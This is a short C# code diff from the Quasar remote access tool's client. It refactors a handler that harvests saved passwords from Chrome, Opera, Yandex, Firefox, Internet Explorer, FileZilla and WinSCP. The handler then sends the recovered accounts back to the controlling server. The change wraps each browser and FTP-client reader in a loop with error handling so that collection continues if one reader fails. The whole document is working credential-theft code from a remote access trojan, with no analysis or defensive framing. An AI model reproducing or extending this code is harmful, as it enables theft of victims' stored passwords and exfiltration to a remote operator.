@@ -1,9 +1,12 @@
-﻿using Quasar.Client.Recovery.Browsers;
+﻿using Quasar.Client.Recovery;
+using Quasar.Client.Recovery.Browsers;
 using Quasar.Client.Recovery.FtpClients;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
+using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 
 namespace Quasar.Client.Messages
 {
@@ -27,13 +30,28 @@ namespace Quasar.Client.Messages
         {
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
 
-            recovered.AddRange(Chrome.GetSavedPasswords());
-            recovered.AddRange(Opera.GetSavedPasswords());
-            recovered.AddRange(Yandex.GetSavedPasswords());
-            recovered.AddRange(InternetExplorer.GetSavedPasswords());
-            recovered.AddRange(Firefox.GetSavedPasswords());
-            recovered.AddRange(FileZilla.GetSavedPasswords());
-            recovered.AddRange(WinSCP.GetSavedPasswords());
+            var passReaders = new IAccountReader[]
+            {
+                new ChromePassReader(), 
+                new OperaPassReader(), 
+                new YandexPassReader(), 
+                new FirefoxPassReader(), 
+                new InternetExplorerPassReader(), 
+                new FileZillaPassReader(), 
+                new WinScpPassReader()
+            };
+
+            foreach (var passReader in passReaders)
+            {
+                try
+                {
+                    recovered.AddRange(passReader.ReadAccounts());
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e);
+                }
+            }
 
             client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
         }
